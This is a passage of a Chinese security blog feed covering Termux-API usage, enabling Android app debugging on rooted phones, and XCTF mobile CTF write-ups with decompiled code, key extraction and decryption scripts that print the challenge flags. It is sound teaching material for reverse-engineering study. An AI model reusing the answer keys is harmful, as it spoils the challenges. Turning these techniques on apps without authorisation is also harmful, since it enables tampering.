CVE-2019-0708 的 EXP 了：</p><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/4.png" srcset="/img/loading.gif" alt></p><h1 id="Termux-API"><a href="#Termux-API" class="headerlink" title="Termux-API"></a>Termux-API</h1><p>其它很多软件像是 Nmap、SQLMap 等等，还有 Github 上的项目都基本和 Linux 中一模一样，可以用 apt 还有 pip 等管理器进行安装。下面记录一下 Termux-API 这一工具。首先要安装一下 <a href="https://play.google.com/store/apps/details?id=com.termux.api" target="_blank" rel="noopener">Termux:API</a> 这一 APP，然后用 apt 安装命令行：</p><pre><code class="bash">apt install termux-api</code></pre><p>获取电池信息：</p><pre><code class="bash">$ termux-battery-status{  &quot;health&quot;: &quot;GOOD&quot;,  &quot;percentage&quot;: 100,  &quot;plugged&quot;: &quot;PLUGGED_USB&quot;,  &quot;status&quot;: &quot;FULL&quot;,  &quot;temperature&quot;: 22.700000762939453,  &quot;current&quot;: -38757}</code></pre><p>获取相机信息：</p><pre><code class="bash">$ termux-camera-info</code></pre><p>获取与设置剪切板：</p><pre><code class="bash">$ termux-clipboard-set thisisassassinq$ termux-clipboard-getthisisassassinq</code></pre><p>获取通讯录列表：</p><pre><code class="bash">$ termux-contact-list</code></pre><p>拨打电话：</p><pre><code class="bash">$ termux-telephony-call 10001</code></pre><p>获取当前 Wi-Fi 连接信息：</p><pre><code class="bash">$ termux-wifi-connectioninfo{  &quot;bssid&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;frequency_mhz&quot;: 2412,  &quot;ip&quot;: &quot;192.168.101.68&quot;,  &quot;link_speed_mbps&quot;: 144,  &quot;mac_address&quot;: &quot;02:00:00:00:00:00&quot;,  &quot;network_id&quot;: 0,  &quot;rssi&quot;: -53,  &quot;ssid&quot;: &quot;&lt;unknown ssid&gt;&quot;,  &quot;ssid_hidden&quot;: true,  &quot;supplicant_state&quot;: &quot;COMPLETED&quot;}</code></pre><p>获取最近一次 Wi-Fi 扫描信息：</p><pre><code class="bash">$ termux-wifi-scaninfo</code></pre><h1 id="nyancat"><a href="#nyancat" class="headerlink" title="nyancat"></a>nyancat</h1><p>彩虹猫是在 2011 年 4 月上传在 YouTube 的视频，并且迅速爆红于网络，并在 2011 年 YouTube 浏览量最高的视频中排名第五。这个视频内容为一只卡通的猫咪飞翔在宇宙中，身后拖出一条彩虹，并且配上了 UTAU 虚拟歌手桃音モモ所演唱的背景音乐。终端版本下载：</p><pre><code class="bash">apt install nyancat</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/5.png" srcset="/img/loading.gif" alt></p><h1 id="终端二维码"><a href="#终端二维码" class="headerlink" title="终端二维码"></a>终端二维码</h1><p>生成终端二维码（字体没选好，效果不太好）：</p><pre><code class="bash">echo &quot;https://qianfei11.github.io&quot; | curl -F-=\&lt;- qrenco.de</code></pre><p><img src="/pics/使用Termux在Android上打造小型Linux服务器/6.png" srcset="/img/loading.gif" alt></p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mushuichuan.com/2017/12/10/termux/" target="_blank" rel="noopener">https://mushuichuan.com/2017/12/10/termux/</a><br><a href="http://blackwolfsec.cc/2016/12/10/termux/" target="_blank" rel="noopener">http://blackwolfsec.cc/2016/12/10/termux/</a><br><a href="https://www.sqlsec.com/2018/05/termux.html" target="_blank" rel="noopener">https://www.sqlsec.com/2018/05/termux.html</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;使用 Termux 可以在 Android 上获得极佳的终端体验。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>不同版本Android动态调试前打开调试开关简述</title>
    <link href="blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/"/>
    <id>blog.b3ale.cn/2020/02/29/%E4%B8%8D%E5%90%8C%E7%89%88%E6%9C%ACAndroid%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E5%89%8D%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%AE%80%E8%BF%B0/</id>
    <published>2020-02-29T02:13:37.000Z</published>
    <updated>2020-03-20T02:50:41.318Z</updated>
    
    <content type="html"><![CDATA[<p>手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。</p><a id="more"></a><h1 id="Intro"><a href="#Intro" class="headerlink" title="Intro"></a>Intro</h1><p>众所周知，最常规的方法就是在 AndroidManifest.xml 中的 application 标签中添加 <code>android:debuggable=&quot;true&quot;</code> 字段，然后再回编译、签名、安装、然后进行动态调试。但这种方法实在太麻烦了。</p><p>网上还有另外一种修改 Android prop 的工具 <a href="https://github.com/wpvsyou/mprop" target="_blank" rel="noopener">mprop</a>，用来修改 <code>default.prop</code> 中的 <code>ro.debuggable</code> 字段为 1（默认为 0）。因为 Android 系统初始化时，init 进程会解析系统属性文件，然后将其保存到内存中去，以便给所有应用提供服务（这种方法可以直接调试所有应用），所以在 init 进程的内存块中是存在这些属性的。在修改完成后要重启 adbd 进程，但这种方法的缺点是在每次开关机后需要重新修改。</p><p>最好的方法是能够直接安装一个程序，能够直接开启所有程序的调试，并且在开关机后也不需要重新设置。</p><h1 id="Android-4"><a href="#Android-4" class="headerlink" title="Android 4"></a>Android 4</h1><p>设备：Nexus 5</p><p>开启动态调试的要求是已 root，并且安装了 Xposed 框架。</p><h2 id="BDOpener"><a href="#BDOpener" class="headerlink" title="BDOpener"></a>BDOpener</h2><p><a href="https://github.com/riusksk/BDOpener" target="_blank" rel="noopener">BDOpener 下载链接</a></p><p>这里使用的是 BDOpener，这是一款 Xposed 的模块，用于修改程序的 debugable 选项，同时也支持开启备份选项，方便数据转移。只需要安装程序后，启用并重启手机，就能调试，可以用 monitor 来查看效果。</p><p><img src="/pics/不同版本Android动态调试前打开调试开关简述/1.png" srcset="/img/loading.gif" alt></p><h1 id="Android-9"><a href="#Android-9" class="headerlink" title="Android 9"></a>Android 9</h1><p>设备：Pixel XL</p><p>开启动态调试的要求是安装了 Magisk 框架（安装后默认 root）。因为 Xposed 的作者在 Android 6 后没有再更新，后来 Android 7 只出了非官方版本，尝试采用了 Magisk+Taichi 的方式来使用上面的 Xposed 模块，但安装了之后发现 Android UI 会在开机之后崩溃，所以尝试了另外一种方法。</p><h2 id="MagiskHidePropsConf"><a href="#MagiskHidePropsConf" class="headerlink" title="MagiskHidePropsConf"></a><a href="https://forum.xda-developers.com/apps/magisk/module-magiskhide-props-config-t3789228" target="_blank" rel="noopener">MagiskHidePropsConf</a></h2><p><a href="https://github.com/Magisk-Modules-Repo/MagiskHidePropsConf" target="_blank" rel="noopener">MagiskHidePropsConf 下载链接</a></p><p><a href="https://github.com/osm0sis/android-busybox-ndk" target="_blank" rel="noopener">Busybox 下载链接</a></p><p>MagiskHidePropsConf 是 Magisk 下的一个模块，可以用来修改系统中内存里的 props 值，并且永久生效，那么就可以用来修改 <code>ro.debuggable</code> 字段了。同时要求安装 Busybox for Android NDK 才能运行。操作如下：</p><pre><code class="sh">marlin:/ # propsLoading... Please wait.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Updating fingerprints list=====================================Checking connection.No connection.MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Select an option below.=====================================1 - Edit device fingerprint2 - Device simulation (disabled)3 - Edit MagiskHide props4 - Add/edit custom props5 - Delete prop values6 - Script settings7 - Collect logsr - Reset all options/settingsb - Reboot devicee - ExitSee the module readme or thesupport thread @ XDA for details.Enter your desired option: 3MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== MagiskHide props (active) Select an option below:=====================================Change the sensitive props set by MagiskHide.1 - ro.debuggable2 - ro.secure3 - ro.build.type4 - ro.build.tags5 - ro.build.selinuxa - Change all propsb - Go back to main menue - ExitPick several options at once byseparating inputs with a comma.Example: 1,5,6See the module readme or thesupport thread @ XDA for details.Enter your desired option: 1MagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== ro.debuggable=====================================Currently set to 0.You currently have the safe value set.Are you sure you want to change it to 1?Enter y(es), n(o) or e(xit): yMagiskHide Props Config v5.2.2by Didgeridoohan @ XDA Developers===================================== Reboot - ro.debuggable=====================================Reboot for changes to take effect.Do you want to reboot now (y/n)?Enter y(es), n(o) or e(xit): yRebooting...</code></pre><p>重启后也可以动态调了，同样可以用 monitor 来验证有没有成功。</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/" target="_blank" rel="noopener">https://ai-sewell.me/2018/%E6%89%93%E5%BC%80%E8%B0%83%E8%AF%95%E5%BC%80%E5%85%B3%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E6%B3%95/</a><br><a href="https://bbs.pediy.com/thread-248322.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-248322.htm</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;手上有两台谷歌儿子，系统版本不同，开启动态调试的方法也不同。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="re" scheme="blog.b3ale.cn/tags/re/"/>
    
      <category term="android" scheme="blog.b3ale.cn/tags/android/"/>
    
  </entry>
  
  <entry>
    <title>攻防世界-MOBILE-新手练习区</title>
    <link href="blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/"/>
    <id>blog.b3ale.cn/2020/02/20/%5BTODO%5D%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-MOBILE-%E6%96%B0%E6%89%8B%E7%BB%83%E4%B9%A0%E5%8C%BA/</id>
    <published>2020-02-20T11:51:47.000Z</published>
    <updated>2020-03-19T15:57:34.426Z</updated>
    
    <content type="html"><![CDATA[<p>持续更新。</p><a id="more"></a><h1 id="app1"><a href="#app1" class="headerlink" title="app1"></a>app1</h1><p>将 apk 拖入 jadx 进行反编译，查看入口点 MainActivity 代码：</p><pre><code class="java">package com.example.yaphetshan.tencentgreat;import android.content.pm.PackageInfo;import android.content.pm.PackageManager.NameNotFoundException;import android.os.Bundle;import android.support.v4.view.accessibility.AccessibilityNodeInfoCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity {    Button btn;    public final String pName = BuildConfig.APPLICATION_ID;    EditText text;    protected void onCreate(Bundle savedInstanceState) {        super.onCreate(savedInstanceState);        setContentView((int) R.layout.activity_main);        this.btn = (Button) findViewById(R.id.checBtn);        this.text = (EditText) findViewById(R.id.input);        this.btn.setOnClickListener(new OnClickListener() {            public void onClick(View v) {                try {                    String inputString = MainActivity.this.text.getText().toString();                    PackageInfo pinfo = MainActivity.this.getPackageManager().getPackageInfo(BuildConfig.APPLICATION_ID, AccessibilityNodeInfoCompat.ACTION_COPY);                    String versionCode = pinfo.versionName; // 获取包信息中的versionName                    int versionName = pinfo.versionCode; // 获取包信息中的versionCode                    int i = 0;                    while (i &lt; inputString.length() &amp;&amp; i &lt; versionCode.length()) {                        if (inputString.charAt(i) != (versionCode.charAt(i) ^ versionName)) { // 将versionCode中的每一字节和versionName异或并和输入比较                            Toast.makeText(MainActivity.this, &quot;\u518d\u63a5\u518d\u5389\uff0c\u52a0\u6cb9~&quot;, 1).show(); // 再接再厉，加油~                            return;                        }                        i++;                    }                    if (inputString.length() == versionCode.length()) { // 判断输入的长度和versionCode是否相同                        Toast.makeText(MainActivity.this, &quot;\u606d\u559c\u5f00\u542f\u95ef\u5173\u4e4b\u95e8\uff01&quot;, 1).show(); // 恭喜开启闯关之门！                        return;                    }                } catch (NameNotFoundException e) {                }                Toast.makeText(MainActivity.this, &quot;\u5e74\u8f7b\u4eba\u4e0d\u8981\u800d\u5c0f\u806a\u660e\u5662&quot;, 1).show(); // 年轻人不要耍小聪明噢            }        });    }}</code></pre><p>代码中可以判断出是将 versionCode 和 versionName 进行异或然后和输入比较，具体信息可以在 AndroidManifest.xml 中找到：</p><pre><code class="xml">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot; android:versionCode=&quot;15&quot; android:versionName=&quot;X&lt;cP[?PHNB&lt;P?aj&quot; package=&quot;com.example.yaphetshan.tencentgreat&quot; platformBuildVersionCode=&quot;25&quot; platformBuildVersionName=&quot;7.1.1&quot;&gt;    &lt;uses-sdk android:minSdkVersion=&quot;19&quot; android:targetSdkVersion=&quot;25&quot; /&gt;    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot; /&gt;    &lt;meta-data android:name=&quot;android.support.VERSION&quot; android:value=&quot;25.3.0&quot; /&gt;    &lt;application android:theme=&quot;@style/AppTheme&quot; android:label=&quot;@string/app_name&quot; android:icon=&quot;@mipmap/ic_launcher&quot; android:debuggable=&quot;true&quot; android:allowBackup=&quot;true&quot; android:supportsRtl=&quot;true&quot; android:roundIcon=&quot;@mipmap/ic_launcher_round&quot;&gt;        &lt;activity android:name=&quot;com.example.yaphetshan.tencentgreat.MainActivity&quot;&gt;            &lt;intent-filter&gt;                &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;            &lt;/intent-filter&gt;        &lt;/activity&gt;    &lt;/application&gt;&lt;/manifest&gt;</code></pre><p>编写脚本来得到 flag：</p><pre><code class="python">#!/usr/bin/env pythonversionCode = 15versionName = &quot;X&lt;cP[?PHNB&lt;P?aj&quot;flag = &#39;&#39;for c in versionName:    flag += chr(ord(c) ^ versionCode)print flag# W3l_T0_GAM3_0ne</code></pre><h1 id="app2"><a href="#app2" class="headerlink" title="app2"></a>app2</h1><p>先使用 jadx 反编译，查看入口点的代码，在两个输入框中输入字符串后会去调用 SecondActivity：</p><pre><code class="java">package com.tencent.testvuln;import android.annotation.SuppressLint;import android.app.Activity;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.os.Handler;import android.support.v4.BuildConfig;import android.util.Log;import android.view.Menu;import android.view.MenuItem;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import com.tencent.testvuln.c.SignatureTool;@SuppressLint({&quot;ShowToast&quot;})public class MainActivity extends Activity implements OnClickListener {    private Button a;    private Handler b = null;    private EditText c;    private EditText d;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main);        this.a = (Button) findViewById(R.id.button1);        this.a.setOnClickListener(this);        this.c = (EditText) findViewById(R.id.editText1);        this.d = (EditText) findViewById(R.id.editText2);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putLong(&quot;ili&quot;, System.currentTimeMillis());        edit.commit();        Log.d(&quot;hashcode&quot;, SignatureTool.getSignature(this) + BuildConfig.VERSION_NAME);    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }    public void onClick(View view) {        switch (view.getId()) {            case R.id.button1:                if (this.c.getText().length() == 0 || this.d.getText().length() == 0) {                    Toast.makeText(this, &quot;\u4e0d\u80fd\u4e3a\u7a7a&quot;, 1).show(); // 不能为空                    return;                }                String obj = this.c.getText().toString(); // 获取第一个输入框中的字符串                String obj2 = this.d.getText().toString(); // 获取第二个输入框中的字符串                Log.e(&quot;test&quot;, obj + &quot; test2 = &quot; + obj2);                Intent intent = new Intent(this, SecondActivity.class); // 设置Intent跳转到SecondActivity                intent.putExtra(&quot;ili&quot;, obj); // 设置变量ili的值为obj的值                intent.putExtra(&quot;lil&quot;, obj2); // 设置变量lil的值为obj2的值                startActivity(intent); // 调用SecondActivity                return;            default:                return;        }    }}</code></pre><p>接下来看看 SecondActivity，将输入的字符串拼接起来，经过 Encryto.doRawData 的操作后和一串 base64 进行比较：</p><pre><code class="java">package com.tencent.testvuln;import android.content.BroadcastReceiver;import android.content.Context;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.view.Menu;import android.view.MenuItem;import android.widget.Toast;import com.tencent.testvuln.c.Encryto;public class SecondActivity extends a {    private BroadcastReceiver c = new BroadcastReceiver(this) {        final /* synthetic */ SecondActivity a;        {            this.a = r1;        }        public void onReceive(Context context, Intent intent) {            Toast.makeText(context, &quot;myReceiver receive&quot;, 0).show();            if (!context.getPackageName().equals(intent.getAction())) {            }        }    };    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main2);        Intent intent = getIntent();        String stringExtra = intent.getStringExtra(&quot;ili&quot;); // obj        String stringExtra2 = intent.getStringExtra(&quot;lil&quot;); // obj2        if (Encryto.doRawData(this, stringExtra + stringExtra2).equals(&quot;VEIzd/V2UPYNdn/bxH3Xig==&quot;)) { // 判断obj+obj2经过Encryto.doRawData后是否等于指定字符串            intent.setAction(&quot;android.test.action.MoniterInstallService&quot;);            intent.setClass(this, MoniterInstallService.class);            intent.putExtra(&quot;company&quot;, &quot;tencent&quot;);            intent.putExtra(&quot;name&quot;, &quot;hacker&quot;);            intent.putExtra(&quot;age&quot;, 18);            startActivity(intent);            startService(intent);        }        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;ilil&quot;, stringExtra);        edit.putString(&quot;lili&quot;, stringExtra2);        edit.commit();    }    public boolean onCreateOptionsMenu(Menu menu) {        getMenuInflater().inflate(R.menu.main, menu);        return true;    }    public boolean onOptionsItemSelected(MenuItem menuItem) {        if (menuItem.getItemId() == R.id.action_settings) {            return true;        }        return super.onOptionsItemSelected(menuItem);    }}</code></pre><p>然后我找到了 Encryto.doRawData 函数的位置。可以看到这里的所有函数都是在 Native 层实现的：</p><pre><code class="java">package com.tencent.testvuln.c;public class Encryto {    public static native int checkSignature(Object obj);    public static native String decode(Object obj, String str);    public static native String doRawData(Object obj, String str);    public static native String encode(Object obj, String str);    public native String HelloLoad();    static {        System.loadLibrary(&quot;JNIEncrypt&quot;);    }}</code></pre><p>用 IDA 打开 libJNIEncrypt.so，然后定位到 JNI_OnLoad，并找到被动态注册的函数：</p><pre><code>.data:00006008 off_6008        DCD aChecksignature_0   ; DATA XREF: register_ndk_load+22↑o.data:00006008                                         ; .text:off_221C↑o.data:00006008                                         ; &quot;checkSignature&quot;.data:0000600C                 DCD aLjavaLangObjec     ; &quot;(Ljava/lang/Object;)I&quot;.data:00006010                 DCD check+1.data:00006014                 DCD aDecode_0           ; &quot;decode&quot;.data:00006018                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:0000601C                 DCD decode+1.data:00006020                 DCD aEncode_0           ; &quot;encode&quot;.data:00006024                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006028                 DCD encode+1.data:0000602C                 DCD aDorawdata_0        ; &quot;doRawData&quot;.data:00006030                 DCD aLjavaLangObjec_0   ; &quot;(Ljava/lang/Object;Ljava/lang/String;)L&quot;....data:00006034                 DCD doRawData+1.data:00006034 ; .data         ends</code></pre><p>看一下其中的 doRawData 函数，发现其中调用了一个 j_AES_128_ECB_PKCS5Padding_Encrypt 函数，可以大概推断出经过了 AES-128 的加密，且加密模式用了 ECB，Padding 用了 PKCS5：</p><pre><code class="cpp">int __fastcall doRawData(_JNIEnv *env, int a2, int a3, char *string){  _JNIEnv *v4; // r4  char *v5; // r9  const char *utf_string; // r6  int ciphertext; // r8  int result; // r0  jstring (__cdecl *v9)(JNIEnv *, const jchar *, jsize); // r6  char *v10; // r5  size_t v11; // r2  int key; // [sp+0h] [bp-28h]  int v13; // [sp+18h] [bp-10h]  v4 = env;  v5 = string;  if ( j_checkSignature((int)env, a2, a3) == 1    &amp;&amp; (strcpy((char *)&amp;key, &quot;thisisatestkey==&quot;),        utf_string = (const char *)((int (__fastcall *)(_JNIEnv *, char *, _DWORD))v4-&gt;functions-&gt;GetStringUTFChars)(                                     v4,                                     v5,                                     0),        ciphertext = j_AES_128_ECB_PKCS5Padding_Encrypt(utf_string, (int)&amp;key),        ((void (__fastcall *)(_JNIEnv *, char *, const char *))v4-&gt;functions-&gt;ReleaseStringUTFChars)(v4, v5, utf_string),        result = ((int (__fastcall *)(_JNIEnv *, int))v4-&gt;functions-&gt;NewStringUTF)(v4, ciphertext),        _stack_chk_guard == v13) )  {    return result;  }  do  {    v9 = v4-&gt;functions-&gt;NewString;    v10 = UNSIGNATURE[0];    v11 = strlen(UNSIGNATURE[0]);  }  while ( _stack_chk_guard != v13 );  result = ((int (__fastcall *)(_JNIEnv *, char *, size_t))v9)(v4, v10, v11);  return result;}</code></pre><p>然后进去看到加密完成之后进行了 base64 加密在返回密文：</p><pre><code class="cpp">int __fastcall AES_128_ECB_PKCS5Padding_Encrypt(const char *a1, int a2){  int v2; // r9  const char *v3; // r10  signed int v4; // r0  signed int v5; // r5  _BYTE *v6; // r11  signed int v7; // r0  const char *v8; // r1  signed int v9; // r8  char *v10; // r10  int v11; // r5  _BYTE *v12; // r0  signed int v13; // r2  char v14; // r6  int v15; // r6  int v16; // r4  int v17; // r5  v2 = a2;  v3 = a1;  v4 = strlen(a1);  v5 = v4;  if ( v4 &lt;= 15 )  {    v6 = malloc(0x10u);    v7 = 0;    do    {      v8 = &amp;byte_3BB0[16 - v5];      if ( v7 &lt; v5 )        v8 = &amp;v3[v7];      v6[v7++] = *v8;    }    while ( v7 != 16 );    v9 = 16;    v10 = (char *)malloc(0x10u);    v11 = 1;LABEL_18:    v15 = 0;    v16 = 0;    do    {      j_AES128_ECB_encrypt(&amp;v6[v15], v2, &amp;v10[v15]);      ++v16;      v15 += 16;    }    while ( v16 &lt; v11 );    goto LABEL_22;  }  v9 = (v4 + 16) &amp; 0xFFFFFFF0;  v12 = malloc(v9);  v6 = v12;  if ( v9 &lt;= 0 )  {    v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);    goto LABEL_22;  }  v13 = 0;  do  {    if ( v13 &gt;= v5 )    {      if ( !(v5 &amp; 0xF) )      {        v12[v13] = 16;        goto LABEL_15;      }      v14 = byte_3BB0[v9 - v5];    }    else    {      v14 = v3[v13];    }    v12[v13] = v14;LABEL_15:    ++v13;  }  while ( v9 != v13 );  v10 = (char *)malloc((v5 + 16) &amp; 0xFFFFFFF0);  if ( v9 &gt;= 16 )  {    v11 = v9 / 16;    goto LABEL_18;  }LABEL_22:  v17 = j_b64_encode((int)v10, v9);  free(v6);  free(v10);  return v17;}</code></pre><p>用 Python 脚本解密得到明文：</p><pre><code class="python">#!/usr/bin/env pythonfrom Crypto.Cipher import AESkey = &#39;thisisatestkey==&#39;aes = AES.new(key, AES.MODE_ECB)ciphertext = &#39;VEIzd/V2UPYNdn/bxH3Xig==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext)# aimagetencent</code></pre><p>尝试提交这串字符串提示错误，再尝试用这字符串登录也没得到什么结果，那么继续往下分析。发现其中调用了多次 Intent，还设置了 IntentFilter，看的眼花缭乱都没找到 flag 在哪里。再去尝试一下交叉引用，看看哪些类调用了 Encryto 类，发现了 FileDataActivity 类中调用了 decode 方法，在 IDA 中可以发现 decode 和 doRawData 的功能一模一样：</p><pre><code class="java">package com.tencent.testvuln;import android.os.Bundle;import android.widget.TextView;import com.tencent.testvuln.c.Encryto;public class FileDataActivity extends a {    private TextView c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView(R.layout.activity_main3);        this.c = (TextView) findViewById(R.id.textView1);        this.c.setText(Encryto.decode(this, &quot;9YuQ2dk8CSaCe7DTAmaqAA==&quot;));    }}</code></pre><p>最后用这里的密文解密得到了 flag：</p><pre><code class="python">...ciphertext2 = &#39;9YuQ2dk8CSaCe7DTAmaqAA==&#39;.decode(&#39;base64&#39;)print aes.decrypt(ciphertext2)# Cas3_0f_A_CAK3</code></pre><h1 id="app3"><a href="#app3" class="headerlink" title="app3"></a>app3</h1><p>拿到文件用 file 没有识别出来，xxd 看一下：</p><pre><code class="bash">$ xxd app3.ab | head00000000: 414e 4452 4f49 4420 4241 434b 5550 0a32  ANDROID BACKUP.200000010: 0a31 0a6e 6f6e 650a 78da e47a e55f 936f  .1.none.x..z._.o00000020: fcaf 8a74 8e1e 0d1b 5d63 0361 303a 4797  ...t....]c.a0:G.00000030: 8422 3d06 8ab4 c248 a507 a373 3046 2328  .&quot;=....H...s0F#(00000040: 2a65 a088 d20c 4623 8222 4883 a252 5202  *e....F#.&quot;H..RR.00000050: 9e7d 7fe7 75fe 80f3 e43c 39d7 93fb 75bf  .}..u....&lt;9...u.00000060: b6dd d775 7de2 1df7 2e8f a0a0 5045 afc0  ...u}.......PE..00000070: bb0a a808 8fbb 41fe 2805 8c47 902f 2a2c  ......A.(..G./*,00000080: d4d7 2340 210c 15e0 850a 080b 47f9 53be  ..#@!.......G.S.00000090: 8052 f450 f4f4 0845 2978 04dd b9f4 7f37  .R.P...E)x.....7</code></pre><p>搜了一下发现是安卓备份文件，可以用 Android Backup Extractor 来解压：</p><pre><code class="bash">$ java -jar abe.jar unpack app3.ab app3.tar &quot;&quot;0% 1% 2% 3% 4% 5% 6% 7% 8% 9% 10% 11% 12% 13% 14% 15% 16% 17% 18% 19% 20% 21% 22% 23% 24% 25% 26% 27% 28% 29% 30% 31% 32% 33% 34% 35% 36% 37% 38% 39% 40% 41% 42% 43% 44% 45% 46% 47% 48% 49% 50% 51% 52% 53% 54% 55% 56% 57% 58% 59% 60% 61% 62% 63% 64% 65% 66% 67% 68% 69% 70% 71% 72% 73% 74% 75% 76% 77% 78% 79% 80% 81% 82% 83% 84% 85% 86% 87% 88% 89% 90% 91% 92% 93% 94% 95% 96% 97% 98% 99% 100%9097216 bytes written to /Users/assassinq/Downloads/app3.tar.</code></pre><p>在解压得到的 tar 包：</p><pre><code class="bash">$ x app3.tarx apps/com.example.yaphetshan.tencentwelcome/a/base.apkx apps/com.example.yaphetshan.tencentwelcome/db/Demo.dbx apps/com.example.yaphetshan.tencentwelcome/Encryto.dbx apps/com.example.yaphetshan.tencentwelcome/_manifest</code></pre><p>生成的文件中，两个 db 都是被加密了的 sqlite 数据库。先来用 jadx 看看 base.apk，可以看到 <code>a()</code> 函数通过一些操作计算出一个密码，来获得一个数据库的接口。详细分析我记录在了注释中，其他的分析再看之后的函数：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.ContentValues;import android.content.Intent;import android.content.SharedPreferences.Editor;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import com.example.yaphetshan.tencentwelcome.a.a;import net.sqlcipher.database.SQLiteDatabase;public class MainActivity extends AppCompatActivity implements OnClickListener {    private SQLiteDatabase a;    private a b;    private Button c;    protected void onCreate(Bundle bundle) {        super.onCreate(bundle);        setContentView((int) R.layout.activity_main);        this.c = (Button) findViewById(R.id.add_data);        this.c.setOnClickListener(this);        Editor edit = getSharedPreferences(&quot;test&quot;, 0).edit();        edit.putString(&quot;Is_Encroty&quot;, &quot;1&quot;); // Is_Encroty=&quot;1&quot;        edit.putString(&quot;Encryto&quot;, &quot;SqlCipher&quot;); // Encryto=&quot;SqlCipher&quot;        edit.putString(&quot;ver_sion&quot;, &quot;3_4_0&quot;); // ver_sion=&quot;3_4_0&quot;        edit.apply();        a();    }    private void a() {        SQLiteDatabase.loadLibs(this);        this.b = new a(this, &quot;Demo.db&quot;, null, 1); // 打开Demo.db        ContentValues contentValues = new ContentValues();        contentValues.put(&quot;name&quot;, &quot;Stranger&quot;); // name=&quot;Stanger&quot;        contentValues.put(&quot;password&quot;, Integer.valueOf(123456)); // password=123456        a aVar = new a();        String a = aVar.a(contentValues.getAsString(&quot;name&quot;), contentValues.getAsString(&quot;password&quot;)); // a = name[:4] + password[:4]        this.a = this.b.getWritableDatabase(aVar.a(a + aVar.b(a, contentValues.getAsString(&quot;password&quot;))).substring(0, 7)); // 将SHA1(a+MD5(a)+&quot;yaphetshan&quot;)[:7]作为密码，获取指定数据库接口        this.a.insert(&quot;TencentMicrMsg&quot;, null, contentValues); // 将数据contentValues插入表TencentMicrMsg    }    public void onClick(View view) {        if (view == this.c) {            Intent intent = new Intent();            intent.putExtra(&quot;name&quot;, &quot;name&quot;);            intent.putExtra(&quot;password&quot;, &quot;pass&quot;);            intent.setClass(this, AnotherActivity.class);            startActivity(intent);        }    }}</code></pre><p>在同一包下的 a 类中，看到了数据库 TencentMicrMsg 的结构，其中有一个 F_l_a_g 字段，可以判断是 flag：</p><pre><code class="java">package com.example.yaphetshan.tencentwelcome;import android.content.Context;import net.sqlcipher.database.SQLiteDatabase;import net.sqlcipher.database.SQLiteDatabase.CursorFactory;import net.sqlcipher.database.SQLiteOpenHelper;/* compiled from: DatabaseManager */public class a extends SQLiteOpenHelper {    private int a = 0;    public a(Context context, String str, CursorFactory cursorFactory, int i) { // 打开指定数据库        super(context, str, cursorFactory, i);    }    public void onCreate(SQLiteDatabase sQLiteDatabase) {        